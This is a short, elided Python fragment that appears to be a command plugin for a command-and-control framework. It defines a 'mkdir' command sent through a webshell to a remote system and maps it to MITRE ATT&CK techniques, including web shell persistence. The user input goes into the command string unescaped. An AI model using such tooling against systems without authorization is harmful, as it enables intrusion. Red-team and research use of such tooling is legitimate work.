...
class MkdirCommand(CommandBase):
    cmd = "mkdir"
    needs_admin = False
    help_cmd = "mkdir <directory_path>"
    description = "Create a new directory at the specified path on the remote system"
    version = 1
    author = "@Termindiego25"
    argument_class = MkdirArguments
    # Map the command to the appropriate MITRE ATT&CK techniques
    attackmapping = ["T1071.001", "T1132.001", "T1505.003"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        """
        Create a new task for executing a mkdir command on the remote system using the webshell.
        ...
        # Construct the command in the form "mkdir <directory_path>"
        user_input = taskData.args.get_arg("directory_path")
        command = f"mkdir {user_input}"
        logger.info(f"Preparing mkdir command: {command}")
        ...
        try:
            ...
            logger.info(f"Request type for mkdir: {requestType}")
